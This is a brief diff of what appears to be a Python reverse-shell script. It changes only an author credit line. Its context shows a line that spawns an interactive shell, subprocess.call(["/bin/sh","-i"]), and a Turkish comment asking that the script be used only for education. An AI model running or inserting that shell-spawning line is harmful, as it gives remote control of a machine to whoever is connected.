@@ -8,4 +8,4 @@ p=subprocess.call(["/bin/sh","-i"])
 
 
 # Sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
-# by Kamil Umut Araz
+# Produced by Kamil Umut Araz
